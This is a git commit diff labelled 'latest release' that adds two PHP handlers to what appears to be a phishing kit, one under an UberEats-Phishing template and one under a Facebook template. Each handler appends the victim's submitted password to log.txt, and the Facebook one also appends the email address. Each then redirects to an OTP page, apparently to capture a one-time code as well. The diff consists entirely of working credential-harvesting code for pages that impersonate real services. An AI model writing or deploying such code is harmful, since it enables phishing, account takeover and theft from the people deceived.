87240f45e86bda94f17b9087f9dfdb12eeed8716
0xbitx <0xbit25125@gmail,com>
2025-04-18 22:53:35 +0800

    latest release

---
+++ templates/UberEats-Phishing/posts.php
@@ -0,0 +1,5 @@
+<?php
+
+    file_put_contents("log.txt", "Pass: " . $_POST['password'] . " ", FILE_APPEND);
+header('Location: otp.login.php');
+exit();
---
+++ templates/facebook/login.php
@@ -0,0 +1,5 @@
+<?php 
+file_put_contents("log.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'], FILE_APPEND);
+header('Location: otp.login.php');
+exit();
+?>
